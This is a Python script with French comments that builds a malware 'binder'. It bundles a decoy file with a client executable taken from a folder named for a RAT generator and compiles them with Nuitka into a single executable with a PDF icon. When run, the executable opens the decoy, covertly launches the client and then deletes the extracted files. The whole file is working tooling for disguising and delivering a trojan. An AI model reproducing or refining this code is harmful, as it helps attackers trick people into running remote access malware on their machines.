import os
import subprocess
import sys
import tempfile
import zipfile


def create_zip_file(zip_path, file_path, client_path):
    """Crée un fichier ZIP contenant le file et l'EXE."""
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        zipf.write(file_path, os.path.basename(file_path))
        zipf.write(client_path, os.path.basename(client_path))

def extract_zip_file(zip_path, extract_to):
    """Extrait le contenu du fichier ZIP dans le répertoire spécifié."""
    with zipfile.ZipFile(zip_path, 'r') as zipf:
        zipf.extractall(extract_to)

def create_temp_script(file_path, client_path):
    """
    Crée un script Python temporaire qui extrait les fichiers du ZIP,
    ouvre le file et exécute l'EXE.
    """
    binder_code = f"""
import os
import subprocess
import sys
import time
import tempfile
import zipfile

def cleanup_files(*files):
    # Supprime les fichiers extraits
    for file in files:
        try:
            os.remove(file)
        except Exception as e:
            print(f"Erreur lors de la suppression de {{file}} : {{e}}")

def extract_zip_file(zip_path, extract_to):
    \"\"\"Extrait le contenu du fichier ZIP dans le répertoire spécifié.\"\"\"
    with zipfile.ZipFile(zip_path, 'r') as zipf:
        zipf.extractall(extract_to)

def execute_and_show():
    with tempfile.TemporaryDirectory() as temp_dir:
        zip_path = os.path.join(os.path.dirname(__file__), 'files.zip')
        extract_zip_file(zip_path, temp_dir)

        file_path = os.path.join(temp_dir, '{os.path.basename(file_path)}')
        client_path = os.path.join(temp_dir, '{os.path.basename(client_path)}')

        # Ouvrir le fichier
        try:
            if '{os.path.splitext(file_path)[1]}' == '.exe':
                subprocess.Popen([str(file_path)], shell=True).wait()
            else:
                if os.name == "nt":  # Windows
                    os.startfile(file_path)
                else:
                    opener = "open" if sys.platform == "darwin" else "xdg-open"
                    subprocess.run([opener, str(file_path)], check=True)
        except Exception as e:
            print(f"Erreur lors de l'ouverture du fichier : {{e}}")  
             
        # Lancer l'exécutable client
        try:
            subprocess.Popen([str(client_path)], shell=True).wait()
        except Exception as e:
            print(f"Erreur lors de l'exécution du fichier EXE : {{e}}")

        # Nettoyer les fichiers extraits après exécution
        time.sleep(10)
        cleanup_files(file_path, client_path)

if __name__ == "__main__":
    execute_and_show()
"""
    temp_file = os.path.join(tempfile.gettempdir(), "temp_binder.py")
    with open(temp_file, "w", encoding="utf-8") as f:
        f.write(binder_code)
    return temp_file

def build_executable_with_nuitka(temp_script, zip_path, output_exe, icon_path):
    """
    Crée un exécutable autonome contenant le script et le fichier ZIP avec Nuitka.
    """
    try:
        subprocess.run([
            sys.executable,
            "-m", "nuitka",
            "--standalone",             # Crée un exécutable autonome
            "--onefile",                # Génère un seul fichier exécutable
            "--mingw64",                # Utilise le compilateur MinGW64
            "--windows-icon-from-ico=" + icon_path,
            f"--include-data-files={zip_path}=files.zip",  # Inclut le fichier ZIP
            f"--output-filename={output_exe}",  # Nom du fichier généré 
            temp_script
        ], check=True)
    except subprocess.CalledProcessError as e:
        raise RuntimeError("Erreur lors de la création de l'exécutable avec Nuitka.") from e

def clean_temp_files(temp_script):
    """Supprime le script temporaire."""
    try:
        os.remove(temp_script)
    except Exception as clean_error:
        print(f"Erreur lors du nettoyage des fichiers temporaires : {clean_error}")

def bind_files(file_path, client_path, output_exe, icon_path):
    """
    Combine l'ouverture d'un file avec l'exécution d'un EXE dans un exécutable unique.
    """
    # Créer le fichier ZIP contenant le PDF et l'EXE
    zip_path = os.path.join(tempfile.gettempdir(), 'files.zip')
    create_zip_file(zip_path, file_path, client_path)

    # Créer le script temporaire
    temp_script = create_temp_script(file_path, client_path)

    # Créer l'exécutable avec Nuitka
    build_executable_with_nuitka(temp_script, zip_path, output_exe, icon_path)

    # Nettoyer le script temporaire
    clean_temp_files(temp_script)

    print(f"Fichier combiné '{output_exe}' généré avec succès.")

if __name__ == "__main__":
    file_path = "C:\\Users\\Maison\\Downloads\\reshacker_setup.exe"  # Chemin du fichier file à ouvrir
    client_path = "C:\\Users\\Maison\\Desktop\\genearteurRAT\\client.exe"  # Chemin de l'exécutable client.exe
    output_exe = f"fichier_combine.exe"  # Nom de l'exécutable final sans extension
    icon_path = "pdf.ico"  # Chemin vers l'icône

    try:
        bind_files(file_path, client_path, output_exe, icon_path)
    except Exception as main_error:
        print(f"Erreur : {main_error}")